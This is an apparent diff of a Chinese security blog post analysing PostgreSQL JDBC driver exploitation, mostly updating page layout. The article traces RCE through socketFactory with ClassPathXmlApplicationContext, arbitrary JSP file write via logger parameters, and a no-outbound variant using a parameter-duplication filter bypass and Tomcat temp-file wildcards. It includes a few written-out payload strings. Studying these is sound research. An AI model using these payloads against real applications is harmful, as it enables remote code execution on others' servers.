@@ -3,14 +3,28 @@
 <head>
   <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<meta name="theme-color" content="#f7f7f4">
-<meta name="color-scheme" content="light">
+<meta name="color-scheme" content="light dark">
+<meta name="theme-color" content="#f7f7f4" data-theme-color-light="#f7f7f4" data-theme-color-dark="#161614">
 
 <title>PostgreSQL-JDBC-Attack — CurlySean&#39;s Blog</title>
 <meta name="description" content="这里是 CurlySean 的个人技术博客，记录漏洞研究、代码审计与攻防实践，整理可以复现、验证与继续推演的技术细节。">
-<link rel="canonical" href="http://curlysean.github.io/2025/08/07/PostgreSQL-JDBC-Attack/">
+<link rel="canonical" href="https://curlysean.github.io/2025/08/07/PostgreSQL-JDBC-Attack/">
+<link rel="preload" href="/fonts/instrument-sans-latin-wght-normal.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/jetbrains-mono-latin-wght-normal.woff2" as="font" type="font/woff2" crossorigin>
 <link rel="stylesheet" href="/css/style.css">
-<script>document.documentElement.classList.add('js')</script>
+<script>
+  (function () {
+    try {
+      var key = 'sheepfold-theme';
+      var saved = localStorage.getItem(key);
+      var dark = saved === 'dark' || (saved !== 'light' && window.matchMedia('(prefers-color-scheme: dark)').matches);
+      document.documentElement.setAttribute('data-theme', dark ? 'dark' : 'light');
+      document.documentElement.classList.add('js');
+    } catch (error) {
+      document.documentElement.classList.add('js');
+    }
+  })();
+</script>
 
 <meta name="generator" content="Hexo 7.3.0"></head>
 <body class="page-type-post">
@@ -37,11 +51,18 @@
         <a class="desktop-nav__link" href="/about/">关于</a>
       
     </nav>
-    <a class="header-cta" href="/archives/">开始阅读 <span aria-hidden="true">↗</span></a>
-    <button class="menu-toggle" type="button" aria-expanded="false" aria-controls="mobile-menu" data-menu-toggle>
-      <span class="sr-only">打开导航</span>
-      <span></span><span></span>
-    </button>
+    <div class="site-header__actions">
+      <button class="theme-toggle" type="button" data-theme-toggle aria-label="切换颜色模式" title="切换颜色模式">
+        <span data-theme-toggle-label>暗色</span>
+      </button>
+      
+        <a class="header-cta header-cta--ghost" href="/archives/">全部文章 <span aria-hidden="true">↗</span></a>
+      
+      <button class="menu-toggle" type="button" aria-expanded="false" aria-controls="mobile-menu" data-menu-toggle>
+        <span class="sr-only">打开导航</span>
+        <span></span><span></span>
+      </button>
+    </div>
   </div>
   <nav class="mobile-nav" id="mobile-menu" aria-label="移动端主导航" data-mobile-menu>
     <div class="frame mobile-nav__inner">
@@ -90,12 +111,6 @@
         
       </div>
     </div>
-    <div class="frame post-meta-grid reveal">
-      <div><span>发布</span><time datetime="2025-08-07T05:37:13.000Z">2025.08.07</time></div>
-      <div><span>更新</span><time datetime="2025-08-07T05:37:13.000Z">2025.08.07</time></div>
-      <div><span>阅读</span><strong>41 MIN</strong></div>
-      <div><span>标签</span><strong>1</strong></div>
-    </div>
   </header>
 
   <div class="frame post-content-layout">
@@ -103,13 +118,19 @@
       <div class="post-rail__inner">
         <p class="eyebrow">ON THIS PAGE</p>
         
-          <nav class="toc" aria-label="文章目录"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#HDMcM"><span class="toc-text">PostgreSQL-JDBC-Attack</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#FdnpK"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NS9IA"><span class="toc-text">PostgreSQL-JDBC RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#aPut1"><span class="toc-text">PostgreSQL Diver出网利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#kB94K"><span class="toc-text">影响版本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#K49ou"><span class="toc-text">漏洞环境</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ti04E"><span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#f8A4x"><span class="toc-text">其他利用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#mczVG"><span class="toc-text">JLabel</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#A8bcB"><span class="toc-text">MiniAdmin</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#tVBEe"><span class="toc-text">IniEnvironment</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ihRex"><span class="toc-text">HikariConfig</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ARtJM"><span class="toc-text">任意文件写入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ldLXH"><span class="toc-text">影响版本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JrAG1"><span class="toc-text">漏洞环境</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#xdkTh"><span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PvIWE"><span class="toc-text">其他利用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#NXNu0"><span class="toc-text">log4j2</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#DQF19"><span class="toc-text">jar&#x2F;war包等zip包</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Y6juf"><span class="toc-text">漏洞修复</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#QUkZI"><span class="toc-text">PostgreSQL不出网利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XjfxO"><span class="toc-text">漏洞分析</span></a></li></ol></li></ol></li></ol></nav>
+          <nav class="toc" aria-label="文章目录"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#FdnpK"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NS9IA"><span class="toc-text">PostgreSQL-JDBC RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#aPut1"><span class="toc-text">PostgreSQL Diver出网利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#kB94K"><span class="toc-text">影响版本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#K49ou"><span class="toc-text">漏洞环境</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ti04E"><span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#f8A4x"><span class="toc-text">其他利用方式</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ARtJM"><span class="toc-text">任意文件写入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ldLXH"><span class="toc-text">影响版本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JrAG1"><span class="toc-text">漏洞环境</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#xdkTh"><span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PvIWE"><span class="toc-text">其他利用方式</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Y6juf"><span class="toc-text">漏洞修复</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#QUkZI"><span class="toc-text">PostgreSQL不出网利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XjfxO"><span class="toc-text">漏洞分析</span></a></li></ol></li></ol></nav>
         
       </div>
     </aside>
     <div class="article-column">
+      <div class="post-meta-grid reveal">
+        <div><span>发布</span><time datetime="2025-08-07T05:37:13.000Z">2025.08.07</time></div>
+        <div><span>更新</span><time datetime="2025-08-07T05:37:13.000Z">2025.08.07</time></div>
+        <div><span>阅读</span><strong>约 13 分钟</strong></div>
+        <div><span>标签</span><strong>1</strong></div>
+      </div>
       <div class="article-body">
-        <h1 id="HDMcM">PostgreSQL-JDBC-Attack</h1>
+        
 <h2 id="FdnpK">前言</h2>
 之前学习过通过Mysql驱动进行JDBC反序列化，最近有听到JDBC不出网的利用方式，今天来学习一下
 
@@ -139,31 +160,31 @@
 <h4 id="ti04E">漏洞分析</h4>
 
 <p>在<code>DiverManager.getConnection(dbUrl)</code>处打一个断点，跟入</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752717492031-ea4da014-ca1b-44ee-a486-8d851a7ea585.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752717492031-ea4da014-ca1b-44ee-a486-8d851a7ea585.png" alt="PostgreSQL-JDBC-Attack" loading="lazy"></p>
 <p>判断出使用<code>postgresql</code>的JDBC驱动进行连接</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752717670986-4dae398e-4241-4d4e-8be4-bd5e6f32b097.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752717670986-4dae398e-4241-4d4e-8be4-bd5e6f32b097.png" alt="PostgreSQL-JDBC-Attack" loading="lazy"></p>
 <p>parseURL会从url中将参数解析出来（里面的逻辑这里不看了，师傅们可以自己去看一下），并调用<code>makeConnection</code>开始连接数据库</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752718092484-ad97875f-07ab-48c7-beef-520adaef1409.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752718092484-ad97875f-07ab-48c7-beef-520adaef1409.png" alt="PostgreSQL-JDBC-Attack" loading="lazy"></p>
 <p>跟进<code>PgConnection</code>的构造方法中，这里调用<code>ConnectionFactory#openConnection</code>，将连接数据库所需要的参数传入</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752718339310-ac9f14ec-7e46-47f6-9772-fa125ee85453.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752718339310-ac9f14ec-7e46-47f6-9772-fa125ee85453.png" alt="PostgreSQL-JDBC-Attack" loading="lazy"></p>
 <p>跟进到<code>ConnectionFactoryImpl#openConnectionImpl</code>方法中，因为我们的可控都在info中，因此我们只需要跟着info走就行</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752718566440-1e03af9f-f2eb-44c0-8c27-1d119990b8eb.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752718566440-1e03af9f-f2eb-44c0-8c27-1d119990b8eb.png" alt="PostgreSQL-JDBC-Attack" loading="lazy"></p>
 <p>再次跟进到<code>SocketFactoryFactory.getSocketFactory(info)</code>方法中，这里get到了<code>socketFactoryClassName</code>和<code>socketFactoryArg</code>，并传入<code>instantiate</code>方法中</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752718857538-90c7558e-cffb-40f6-b273-60961c79956e.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752718857538-90c7558e-cffb-40f6-b273-60961c79956e.png" alt="PostgreSQL-JDBC-Attack" loading="lazy"></p>
 <p>在<code>ObjectFactory#instantiate</code>中，实际是通过反射调用去构造一个<code>ClassPathXmlApplicationContext</code>类</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752719038204-51b7a651-6c10-472a-be4d-f76a4238a178.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752719038204-51b7a651-6c10-472a-be4d-f76a4238a178.png" alt="PostgreSQL-JDBC-Attack" loading="lazy"></p>
 <p>跟到<code>ClassPathXmlApplicationContext</code>的构造函数中，首先将xml文件的远程url地址赋值<code>configLocations</code>，然后调用<code>refresh</code>方法，我们跟进查看</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752719306701-2c2860f8-bdd6-41e5-a2ff-84ee14fc7f00.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752719306701-2c2860f8-bdd6-41e5-a2ff-84ee14fc7f00.png" alt="PostgreSQL-JDBC-Attack" loading="lazy"></p>
 <p>这里的<code>obtainFreshBeanFactory</code>方法，是从远程加载我们的xml文件内容的，跟进看看</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752719417570-eb338480-8875-4bb0-84b2-cade058a50f3.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752719417570-eb338480-8875-4bb0-84b2-cade058a50f3.png" alt="PostgreSQL-JDBC-Attack" loading="lazy"></p>
 <p>跟入<code>refreshBeanFactory</code>，调用了<code>loadBeanDefinitions</code>方法，继续跟进查看</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752720025961-1789c579-f995-4f27-a73f-4fc2590da661.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752720025961-1789c579-f995-4f27-a73f-4fc2590da661.png" alt="PostgreSQL-JDBC-Attack" loading="lazy"></p>
 <p>最后在<code>reader#loadBeanDefinitions</code>中读取了我们的xml文件内容</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752720116534-a9be4289-d1f5-4a1c-a23a-02f574fb9554.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752720116534-a9be4289-d1f5-4a1c-a23a-02f574fb9554.png" alt="PostgreSQL-JDBC-Attack" loading="lazy"></p>
 <p>返回<code>refresh</code>方法中，漏洞的触发在<code>finishBeanFactoryInitialization</code>方法内，这里对我们传入的poc.xml文件进行解析，最后SPEL表达式的执行，然后触发漏洞</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752721327115-2dc5d9fd-74cc-4520-b302-33bbffd33d5e.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752721327115-2dc5d9fd-74cc-4520-b302-33bbffd33d5e.png" alt="PostgreSQL-JDBC-Attack" loading="lazy"></p>
 <p>漏洞触发情况如下</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/44744277/1752721424465-20e7cd1a-28f5-45cc-a1d3-900e0a1ed300.png?x-oss-process=image/format,webp"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/44744277/1752721424465-20e7cd1a-28f5-45cc-a1d3-900e0a1ed300.png?x-oss-process=image/format,webp" alt="PostgreSQL-JDBC-Attack" loading="lazy"></p>
 <h4 id="f8A4x">其他利用方式</h4>
 
 <p>其他的利用方式这里就不分析了，只给出相关Poc</p>
@@ -203,15 +224,15 @@ Mysql的套娃，需要有mysql-connector-java（<font style="color:rgb(0, 0, 0)
 <h4 id="xdkTh">漏洞分析</h4>
 
 <p>看到<code>postgresql</code>驱动的<code>connect</code>方法中，在<code>makeConnection</code>方法前，有<code>setupLoggerFromProperties</code>方法，是用来配置Logger信息的</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752723064881-30432783-88a2-4e3a-8ac0-0aca3b0cb354.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752723064881-30432783-88a2-4e3a-8ac0-0aca3b0cb354.png" alt="PostgreSQL-JDBC-Attack" loading="lazy"></p>
 <p>跟到<code>setupLoggerFromProperties</code>中，首先判断LogLevel为DEBUG，然后获取到我们的文件名为<code>hack.jsp</code>（这里文件中并没有对filename进行过滤，我们这里可以通过<code>../</code>进行目录穿越，上传到任何地方）</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752723231734-d2a51162-7923-442a-878f-98435a4af9fa.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752723231734-d2a51162-7923-442a-878f-98435a4af9fa.png" alt="PostgreSQL-JDBC-Attack" loading="lazy"></p>
 <p>后面日志操作进行初始化，在文件夹下创建一个<code>hack.jsp</code>文件</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752723419702-b8486237-9db8-45c3-a2a3-c1aaa48854ed.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752723419702-b8486237-9db8-45c3-a2a3-c1aaa48854ed.png" alt="PostgreSQL-JDBC-Attack" loading="lazy"></p>
 <p>跳出<code>setupLoggerFromProperties</code>方法，下一步就进行了日志的记录，将我们的url记录到<code>hack.jsp</code>中，在java环境下，jsp文件中<code>&lt;% %&gt;</code>将被解析，也可以达到RCE的效果</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752723581540-210c0973-e416-4eca-9ecf-14754e7459eb.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752723581540-210c0973-e416-4eca-9ecf-14754e7459eb.png" alt="PostgreSQL-JDBC-Attack" loading="lazy"></p>
 <p><code>hack.jsp</code>效果如下</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752723759099-880ec78e-280d-4513-9e10-4690d5d38f01.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752723759099-880ec78e-280d-4513-9e10-4690d5d38f01.png" alt="PostgreSQL-JDBC-Attack" loading="lazy"></p>
 <h4 id="PvIWE">其他利用方式</h4>
 <h5 id="NXNu0">log4j2</h5>
 在导入log4j版本为存在漏洞版本时，就可能配合log4j2实现JNDI注入
@@ -224,59 +245,59 @@ Mysql的套娃，需要有mysql-connector-java（<font style="color:rgb(0, 0, 0)
 <h3 id="Y6juf">漏洞修复</h3>
 漏洞修复，是在各个接口实例化时，加上了期望类的判断
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752807025171-eabc64e9-b691-452f-b6bb-dfa90ec0261e.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752807025171-eabc64e9-b691-452f-b6bb-dfa90ec0261e.png" alt="PostgreSQL-JDBC-Attack" loading="lazy"></p>
 <h2 id="QUkZI">PostgreSQL不出网利用</h2>
 <h3 id="XjfxO">漏洞分析</h3>
 
 <p>这里直接拿p神的挑战，来进行分析</p>
 <p>在我们到Controller之前，首先要经过一个Filter，要求我们的参数中不能同时包含<code>jdbc:postgresql</code>和<code>socketFactory</code></p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752762574412-9a660e34-1f90-4205-8140-6ead46619902.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752762574412-9a660e34-1f90-4205-8140-6ead46619902.png" alt="PostgreSQL-JDBC-Attack" loading="lazy"></p>
 <p>这里我们利用<code>getParameter</code>方法和在controller来get参数解析差异进行绕过，<code>getParameter</code>方法在有多个url参数时，只获取第一个url</p>
 <p>传入url如下</p>
 <p>可以看到在Filter中<code>request.getParameter(url)</code>方法中，接收到的只有<code>jdbc:postgresql://127.0.0.1:5432/test/?a=</code>，这里的url并不同时包含<code>jdbc:postgresql</code>和<code>socketFactory</code>，因此我们可以走到Controller中</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=jdbc:postgresql://127.0.0.1:5432/test/?a=&amp;url=%26socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext%26socketFactoryArg=1 </span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752763086097-c6e7ab4c-4897-4751-a479-a04e7be07a4f.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752763086097-c6e7ab4c-4897-4751-a479-a04e7be07a4f.png" alt="PostgreSQL-JDBC-Attack" loading="lazy"></p>
 <p>走到Controller中，我们可以看到，接受的参数为<code>jdbc:postgresql://127.0.0.1:5432/test/?a=,&amp;socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&amp;socketFactoryArg=1</code></p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752763263976-ea3c636c-a5c8-4106-a6f2-648d7120cd50.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752763263976-ea3c636c-a5c8-4106-a6f2-648d7120cd50.png" alt="PostgreSQL-JDBC-Attack" loading="lazy"></p>
 <p>这里通过一个<code>,</code>替换了<code>&amp;url</code>，以逗号为分隔符，将两个url参数拼接到一起，这样就可以成功绕过Filter的阻碍</p>
 <p>我们继续看到Controller中，这里这段代码，直接禁止程序进行网络访问操作（之前不知道，现在才理解了为什么会有那么多不出网情况下的利用），因此我们无法通过http请求来获取Poc里面的值</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.setSecurityManager(<span class="keyword">new</span> <span class="title class_">ForbiddenNetworkAccessSecurityManager</span>());</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752763719916-dfcbc403-0a67-49ce-b8f8-3bf8e5d3d261.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752763719916-dfcbc403-0a67-49ce-b8f8-3bf8e5d3d261.png" alt="PostgreSQL-JDBC-Attack" loading="lazy"></p>
 <p>接下来就要解析Url里面的环境变量了</p>
 <p>我们使用<code>$&#123;catalina.home&#125;</code>作为<code>socketFactoryArg</code>的值</p>
 <p>跟到<code>ClassPathXmlApplicationContext</code>的构造方法内，走入<code>setConfigLoacations</code>方法中，里面有个<code>resolvePath</code>，继续跟进</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752768356045-d359de20-270d-4f15-846d-2167fab6f555.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752768356045-d359de20-270d-4f15-846d-2167fab6f555.png" alt="PostgreSQL-JDBC-Attack" loading="lazy"></p>
 <p>跟进<code>resolvePath</code>后继续跟入<code>getEnvironment</code>方法内，这里的<code>createEnvronment</code>创建了一个<code>StandardEnvironment</code>对象，这个对象是spring中用来处理环境变量的类</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752768495825-c674ae7b-e851-41de-ba72-24b0df61ce33.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752768495825-c674ae7b-e851-41de-ba72-24b0df61ce33.png" alt="PostgreSQL-JDBC-Attack" loading="lazy"></p>
 <p>步出，准备跟进<code>resolveRequiredPlaceholders</code>方法</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752768596070-522bf67d-bdfe-4b68-a767-14ae4b830b28.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752768596070-522bf67d-bdfe-4b68-a767-14ae4b830b28.png" alt="PostgreSQL-JDBC-Attack" loading="lazy"></p>
 <p>继续跟进<code>doResolcePlaceholders</code>方法，应该是通过构造的<code>strictHelper</code>对text的内容进行解析</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752768664431-c9c4f69e-0d82-4119-8b47-7882077a967b.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752768664431-c9c4f69e-0d82-4119-8b47-7882077a967b.png" alt="PostgreSQL-JDBC-Attack" loading="lazy"></p>
 <p>一步一步跟到<code>parseStringValue</code>中，这里将<code>$&#123;&#125;</code>中的内容截取出来</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752768890828-5fb8ed53-4d96-470c-892f-4aa004f88995.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752768890828-5fb8ed53-4d96-470c-892f-4aa004f88995.png" alt="PostgreSQL-JDBC-Attack" loading="lazy"></p>
 <p>然后将<code>catalina.home</code>的值解析成了我们tomcat临时文件的路径</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752769005198-ec3c7766-57d3-4d44-bdd3-b76341b62cb9.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752769005198-ec3c7766-57d3-4d44-bdd3-b76341b62cb9.png" alt="PostgreSQL-JDBC-Attack" loading="lazy"></p>
 <p>当我们以文件上传的格式传入数据时，就会创建这个临时文件，内容是我们所上传的东西，在调用完成后这个文件就会消失</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752804841499-dbae363f-de51-4f74-a2e1-10c3ea5f2b8f.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752804841499-dbae363f-de51-4f74-a2e1-10c3ea5f2b8f.png" alt="PostgreSQL-JDBC-Attack" loading="lazy"></p>
 <p>临时文件的名称是随机的，但是我们可以通过通配符来匹配临时文件从而进行命令执行，这里我们将<code>socketFactoryArg</code>的值替换为<code>file://$&#123;catalina.home&#125;/**/*.tmp</code>进行分析</p>
 <p>在refresh方法中，进行加载文件时，会走到getResources方法中，调用栈如下</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">getResources:<span class="number">279</span>, PathMatchingResourcePatternResolver (org.springframework.core.io.support)</span><br><span class="line">getResources:<span class="number">1423</span>, AbstractApplicationContext (org.springframework.context.support)</span><br><span class="line">loadBeanDefinitions:<span class="number">231</span>, AbstractBeanDefinitionReader (org.springframework.beans.factory.support)</span><br><span class="line">loadBeanDefinitions:<span class="number">203</span>, AbstractBeanDefinitionReader (org.springframework.beans.factory.support)</span><br><span class="line">loadBeanDefinitions:<span class="number">265</span>, AbstractBeanDefinitionReader (org.springframework.beans.factory.support)</span><br><span class="line">loadBeanDefinitions:<span class="number">128</span>, AbstractXmlApplicationContext (org.springframework.context.support)</span><br><span class="line">loadBeanDefinitions:<span class="number">94</span>, AbstractXmlApplicationContext (org.springframework.context.support)</span><br><span class="line">refreshBeanFactory:<span class="number">130</span>, AbstractRefreshableApplicationContext (org.springframework.context.support)</span><br><span class="line">obtainFreshBeanFactory:<span class="number">671</span>, AbstractApplicationContext (org.springframework.context.support)</span><br><span class="line">refresh:<span class="number">553</span>, AbstractApplicationContext (org.springframework.context.support)</span><br><span class="line">&lt;init&gt;:<span class="number">144</span>, ClassPathXmlApplicationContext (org.springframework.context.support)</span><br><span class="line">&lt;init&gt;:<span class="number">85</span>, ClassPathXmlApplicationContext (org.springframework.context.support)</span><br></pre></td></tr></table></figure>
 
 <p>经过一些判断后，最终会走到<code>isPattern</code>方法处</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752803786059-4c245832-5a15-48b2-b736-d1c5bc4a1586.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752803786059-4c245832-5a15-48b2-b736-d1c5bc4a1586.png" alt="PostgreSQL-JDBC-Attack" loading="lazy"></p>
 <p>我们跟进查看一下该方法，可看到该方法里面的代码逻辑是判断：路径字符中是否有用通配符，从而决定是否要做模式匹配搜索</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752803847284-7c42f944-d291-4ecc-92cb-2c0c9585840d.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752803847284-7c42f944-d291-4ecc-92cb-2c0c9585840d.png" alt="PostgreSQL-JDBC-Attack" loading="lazy"></p>
 <p>走入<code>findPathMatchingResources</code>方法中，跟进<code>doFindPathMatchingFileResources</code></p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752805221675-11c63fc2-459b-46c5-b9fa-7cf383298346.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752805221675-11c63fc2-459b-46c5-b9fa-7cf383298346.png" alt="PostgreSQL-JDBC-Attack" loading="lazy"></p>
 <p><code>doFindPathMatchingFileResources</code>方法中，就可以找到我们的临时文件，最后通过file协议读取内容</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752805413860-11b337eb-848e-489d-a400-7084bd98a886.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752805413860-11b337eb-848e-489d-a400-7084bd98a886.png" alt="PostgreSQL-JDBC-Attack" loading="lazy"></p>
 <p>通过JavaChains构建一个回显马xml，然后构造数据包进行请求</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752805581279-0ff4c97a-7c4d-40e8-b895-ee2727b6d2b6.png">构造数据包如下，一个数据包就可以完成不出网的利用</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752805581279-0ff4c97a-7c4d-40e8-b895-ee2727b6d2b6.png" alt="PostgreSQL-JDBC-Attack" loading="lazy">构造数据包如下，一个数据包就可以完成不出网的利用</p>
